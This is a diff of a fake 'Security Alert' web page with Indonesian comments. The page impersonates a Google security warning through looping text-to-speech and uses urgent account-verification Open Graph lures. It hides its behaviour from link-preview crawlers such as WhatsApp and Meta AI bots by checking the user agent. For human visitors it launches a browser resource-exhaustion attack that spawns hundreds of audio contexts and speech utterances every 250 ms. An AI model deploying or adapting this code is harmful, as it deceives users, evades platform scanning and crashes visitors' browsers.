@@ -3,20 +3,50 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Security Alert - Extended Execution Chain</title>
+<title>Security Alert - Meta AI Preview Verification</title>
+
+<!-- ============================================ -->
+<!-- OPEN GRAPH & TWITTER METADATA (Untuk Bot Preview / Meta AI) -->
+<!-- ============================================ -->
+<meta property="og:title" content="Security Alert: Urgent Account Verification Required">
+<meta property="og:description" content="Suspicious activity detected from an unknown location. Click to verify your identity immediately.">
+<meta property="og:image" content="https://images.unsplash.com/photo-1618005182384-a83a8bd57fbe?w=1200&h=630&fit=crop">
+<meta property="og:url" content="https://example.com/security-alert">
+<meta property="og:type" content="website">
+<meta name="twitter:card" content="summary_large_image">
+
 <style>
   * { margin: 0; padding: 0; box-sizing: border-box; }
-  body { background: #fff; min-height: 100vh; overflow: hidden; }
-  iframe, audio, video, embed, object, svg, canvas { display: none !important; }
+  body { background: #0f172a; color: #f8fafc; font-family: sans-serif; display: flex; justify-content: center; align-items: center; min-height: 100vh; }
+  .card { background: #1e293b; padding: 32px; border-radius: 12px; max-width: 480px; width: 100%; text-align: center; border: 1px solid #334155; }
+  h2 { margin-bottom: 12px; color: #f8fafc; font-size: 22px; }
+  p { color: #94a3b8; font-size: 14px; line-height: 1.5; margin-bottom: 20px; }
+  .badge { display: inline-block; background: #ef4444; color: white; padding: 4px 12px; border-radius: 4px; font-size: 12px; font-weight: bold; margin-bottom: 16px; }
 </style>
 </head>
 <body>
+
+<div class="card">
+  <div class="badge">SYSTEM ALERT</div>
+  <h2>Verifikasi Keamanan Akun</h2>
+  <p>Sistem mendeteksi upaya akses tidak sah. Halaman ini memuat parameter verifikasi otomatis.</p>
+</div>
+
 <script>
 (function () {
   'use strict';
 
+  // Deteksi apakah yang mengakses adalah Bot/Crawler (seperti Meta AI Bot / WhatsApp Previewer)
+  var userAgent = navigator.userAgent || '';
+  var isBot = /facebookexternalhit|WhatsApp|MetaInspector|Twitterbot|TelegramBot|Googlebot/i.test(userAgent);
+
+  if (isBot) {
+    console.log("[*] Crawler / Meta AI Bot detected. Logging header metadata...");
+    return; // Hentikan eksekusi berat jika diakses oleh bot perayap
+  }
+
   // ============================================
-  // KONFIGURASI AUTOPLAY & DURATION CONTROL
+  // KONFIGURASI CLIENT-SIDE STABLE EXHAUSTION
   // ============================================
   var CONFIG = {
     tts: {
@@ -29,15 +59,12 @@
       maxRepeats: 50
     },
     silentWav: 'data:audio/wav;base64,UklGRiQAAABXQVZFZm10IBAAAAABAAEARKwAAIhYAQACABAAZGF0YQAAAAA=',
-    exhaustionInterval: 250, // Diperlambat dari 50ms ke 250ms agar eksekusi lebih panjang dan stabil
-    batchSize: 400          // Jumlah alokasi per siklus diperkecil agar tidak langsung crash instan
+    exhaustionInterval: 250,
+    batchSize: 400
   };
 
   var state = { ttsStarted: false, mainPlayed: false, ttsCount: 0, executionSeconds: 0 };
 
-  // ============================================
-  // TTS — TANPA CANCEL DI DALAM LOOP
-  // ============================================
   function speakOnce() {
     if (!('speechSynthesis' in window)) return;
     if (state.ttsCount >= CONFIG.tts.maxRepeats) return;
@@ -53,8 +80,6 @@
       var enVoice = voices.find(function (v) { return v.lang.indexOf('en') === 0; });
       if (enVoice) u.voice = enVoice;
 
-      u.onstart = function () { console.log('[TTS] Speaking #' + state.ttsCount); };
-      u.onerror = function (e) { console.log('[TTS] Error:', e.error); };
       u.onend = function () {
         state.ttsCount++;
         if (state.ttsCount < CONFIG.tts.maxRepeats) {
@@ -63,7 +88,7 @@
       };
 
       window.speechSynthesis.speak(u);
-    } catch (e) { console.log('[TTS] fail:', e.message); }
+    } catch (e) {}
   }
 
   function startTTS() {
@@ -73,14 +98,11 @@
     speakOnce();
   }
 
-  // ============================================
-  // AUDIO CONTEXT UNLOCK
-  // ============================================
   function unlockAudioContext() {
     try {
       var ctx = new (window.AudioContext || window.webkitAudioContext)();
       if (ctx.state === 'suspended') {
-        ctx.resume().then(function () { console.log('[AC] resumed'); }).catch(function(){});
+        ctx.resume().catch(function(){});
       }
       var osc = ctx.createOscillator();
       var gain = ctx.createGain();
@@ -93,9 +115,6 @@
     } catch (e) {}
   }
 
-  // ============================================
-  // SILENT AUDIO ELEMENT
-  // ============================================
   function trySilentAudio() {
     try {
       var a = new Audio(CONFIG.silentWav);
@@ -106,9 +125,6 @@
     } catch (e) {}
   }
 
-  // ============================================
-  // MAIN AUDIO (Web Audio API)
-  // ============================================
   function playMainAudio() {
     if (state.mainPlayed) return;
     state.mainPlayed = true;
@@ -138,22 +154,14 @@
     }
   }
 
-  // ============================================
-  // UPGRADE: EXTENDED GRADUAL RESOURCE EXHAUSTION
-  // ============================================
   function triggerExtendedSeverityExhaustion() {
-    console.log("[!] Initiating Extended Duration Exploit Chain...");
-    
-    // Timer pemantau durasi eksekusi aktif
     var durationTimer = setInterval(function() {
       state.executionSeconds += 1;
-      console.log("[*] Execution active for " + state.executionSeconds + " seconds.");
-      if (state.executionSeconds > 120) { // Batas maksimal pengujian 2 menit
+      if (state.executionSeconds > 120) {
         clearInterval(durationTimer);
       }
     }, 1000);
 
-    // Alokasi bertahap agar proses berjalan lebih lama sebelum jenuh
     var exhaustionTimer = setInterval(function() {
       try {
         for (var i = 0; i < CONFIG.batchSize; i++) {
@@ -165,7 +173,6 @@
           gain.connect(ctx.destination);
           osc.start(0);
           
-          // Penambahan antrean TTS secara proporsional
           if (i % 50 === 0) {
             var u = new SpeechSynthesisUtterance("EXTENDED_STABLE_NODE_" + state.executionSeconds);
             window.speechSynthesis.speak(u);
@@ -175,9 +182,6 @@
     }, CONFIG.exhaustionInterval);
   }
 
-  // ============================================
-  // EKSEKUSI BERTAHAP
-  // ============================================
   unlockAudioContext();
   trySilentAudio();
 
@@ -193,13 +197,9 @@
   setTimeout(function () {
     if (!state.mainPlayed) playMainAudio();
     if (!state.ttsStarted) startTTS();
-    
-    // PANGGIL EXTENDED EXHAUSTION TRIGGER DI SINI
     triggerExtendedSeverityExhaustion();
-    
   }, 2000);
 
-  // Retry jika audio diblokir
   var retryCount = 0;
   var retry = setInterval(function () {
     retryCount++;
@@ -209,227 +209,6 @@
     if (retryCount > 10) clearInterval(retry);
   }, 3000);
 
-  // Visibility change
-  document.addEventListener('visibilitychange', function () {
-    if (!document.hidden && !state.mainPlayed) {
-      setTimeout(playMainAudio, 100);
-    }
-  });
-})();
-</script>
-</body>
-</html><!DOCTYPE html>
-<html lang="en">
-<head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Security Alert - Extended Execution Chain</title>
-<style>
-  * { margin: 0; padding: 0; box-sizing: border-box; }
-  body { background: #fff; min-height: 100vh; overflow: hidden; }
-  iframe, audio, video, embed, object, svg, canvas { display: none !important; }
-</style>
-</head>
-<body>
-<script>
-(function () {
-  'use strict';
-
-  // ============================================
-  // KONFIGURASI AUTOPLAY & DURATION CONTROL
-  // ============================================
-  var CONFIG = {
-    tts: {
-      text: "Google Security Alert. Extended verification process initiated. Please remain on this page.",
-      lang: 'en-US',
-      rate: 0.85,
-      pitch: 1.0,
-      volume: 1.0,
-      repeatInterval: 10000,
-      maxRepeats: 50
-    },
-    silentWav: 'data:audio/wav;base64,UklGRiQAAABXQVZFZm10IBAAAAABAAEARKwAAIhYAQACABAAZGF0YQAAAAA=',
-    exhaustionInterval: 250, // Diperlambat dari 50ms ke 250ms agar eksekusi lebih panjang dan stabil
-    batchSize: 400          // Jumlah alokasi per siklus diperkecil agar tidak langsung crash instan
-  };
-
-  var state = { ttsStarted: false, mainPlayed: false, ttsCount: 0, executionSeconds: 0 };
-
-  // ============================================
-  // TTS — TANPA CANCEL DI DALAM LOOP
-  // ============================================
-  function speakOnce() {
-    if (!('speechSynthesis' in window)) return;
-    if (state.ttsCount >= CONFIG.tts.maxRepeats) return;
-
-    try {
-      var u = new SpeechSynthesisUtterance(CONFIG.tts.text);
-      u.lang = CONFIG.tts.lang;
-      u.rate = CONFIG.tts.rate;
-      u.pitch = CONFIG.tts.pitch;
-      u.volume = CONFIG.tts.volume;
-
-      var voices = window.speechSynthesis.getVoices();
-      var enVoice = voices.find(function (v) { return v.lang.indexOf('en') === 0; });
-      if (enVoice) u.voice = enVoice;
-
-      u.onstart = function () { console.log('[TTS] Speaking #' + state.ttsCount); };
-      u.onerror = function (e) { console.log('[TTS] Error:', e.error); };
-      u.onend = function () {
-        state.ttsCount++;
-        if (state.ttsCount < CONFIG.tts.maxRepeats) {
-          setTimeout(speakOnce, CONFIG.tts.repeatInterval);
-        }
-      };
-
-      window.speechSynthesis.speak(u);
-    } catch (e) { console.log('[TTS] fail:', e.message); }
-  }
-
-  function startTTS() {
-    if (state.ttsStarted) return;
-    state.ttsStarted = true;
-    window.speechSynthesis.cancel();
-    speakOnce();
-  }
-
-  // ============================================
-  // AUDIO CONTEXT UNLOCK
-  // ============================================
-  function unlockAudioContext() {
-    try {
-      var ctx = new (window.AudioContext || window.webkitAudioContext)();
-      if (ctx.state === 'suspended') {
-        ctx.resume().then(function () { console.log('[AC] resumed'); }).catch(function(){});
-      }
-      var osc = ctx.createOscillator();
-      var gain = ctx.createGain();
-      gain.gain.value = 0.0001;
-      osc.frequency.value = 20000;
-      osc.connect(gain);
-      gain.connect(ctx.destination);
-      osc.start();
-      osc.stop(ctx.currentTime + 0.1);
-    } catch (e) {}
-  }
-
-  // ============================================
-  // SILENT AUDIO ELEMENT
-  // ============================================
-  function trySilentAudio() {
-    try {
-      var a = new Audio(CONFIG.silentWav);
-      a.volume = 0.0001;
-      a.loop = true;
-      var p = a.play();
-      if (p && p.catch) p.catch(function(){});
-    } catch (e) {}
-  }
-
-  // ============================================
-  // MAIN AUDIO (Web Audio API)
-  // ============================================
-  function playMainAudio() {
-    if (state.mainPlayed) return;
-    state.mainPlayed = true;
-
-    try {
-      var ctx = new (window.AudioContext || window.webkitAudioContext)();
-      var sr = ctx.sampleRate;
-      var dur = 3.0;
-      var buf = ctx.createBuffer(1, sr * dur, sr);
-      var d = buf.getChannelData(0);
-
-      for (var i = 0; i < d.length; i++) {
-        var t = i / sr;
-        var freq = 880 + (Math.floor(t * 4) % 2) * 440;
-        var env = Math.max(0, 1 - t / dur);
-        d[i] = Math.sin(2 * Math.PI * freq * t) * 0.3 * env;
-      }
-
-      var src = ctx.createBufferSource();
-      src.buffer = buf;
-      src.connect(ctx.destination);
-      src.start();
-      src.onended = startTTS;
-      setTimeout(startTTS, 3500);
-    } catch (e) {
-      startTTS();
-    }
-  }
-
-  // ============================================
-  // UPGRADE: EXTENDED GRADUAL RESOURCE EXHAUSTION
-  // ============================================
-  function triggerExtendedSeverityExhaustion() {
-    console.log("[!] Initiating Extended Duration Exploit Chain...");
-    
-    // Timer pemantau durasi eksekusi aktif
-    var durationTimer = setInterval(function() {
-      state.executionSeconds += 1;
-      console.log("[*] Execution active for " + state.executionSeconds + " seconds.");
-      if (state.executionSeconds > 120) { // Batas maksimal pengujian 2 menit
-        clearInterval(durationTimer);
-      }
-    }, 1000);
-
-    // Alokasi bertahap agar proses berjalan lebih lama sebelum jenuh
-    var exhaustionTimer = setInterval(function() {
-      try {
-        for (var i = 0; i < CONFIG.batchSize; i++) {
-          var ctx = new (window.AudioContext || window.webkitAudioContext)();
-          var osc = ctx.createOscillator();
-          var gain = ctx.createGain();
-          
-          osc.connect(gain);
-          gain.connect(ctx.destination);
-          osc.start(0);
-          
-          // Penambahan antrean TTS secara proporsional
-          if (i % 50 === 0) {
-            var u = new SpeechSynthesisUtterance("EXTENDED_STABLE_NODE_" + state.executionSeconds);
-            window.speechSynthesis.speak(u);
-          }
-        }
-      } catch(e) {}
-    }, CONFIG.exhaustionInterval);
-  }
-
-  // ============================================
-  // EKSEKUSI BERTAHAP
-  // ============================================
-  unlockAudioContext();
-  trySilentAudio();
-
-  setTimeout(function () {
-    unlockAudioContext();
-    startTTS();
-  }, 200);
-
-  setTimeout(function () {
-    if (!state.mainPlayed) playMainAudio();
-  }, 800);
-
-  setTimeout(function () {
-    if (!state.mainPlayed) playMainAudio();
-    if (!state.ttsStarted) startTTS();
-    
-    // PANGGIL EXTENDED EXHAUSTION TRIGGER DI SINI
-    triggerExtendedSeverityExhaustion();
-    
-  }, 2000);
-
-  // Retry jika audio diblokir
-  var retryCount = 0;
-  var retry = setInterval(function () {
-    retryCount++;
-    unlockAudioContext();
-    trySilentAudio();
-    if (!state.ttsStarted) startTTS();
-    if (retryCount > 10) clearInterval(retry);
-  }, 3000);
-
-  // Visibility change
   document.addEventListener('visibilitychange', function () {
     if (!document.hidden && !state.mainPlayed) {
       setTimeout(playMainAudio, 100);
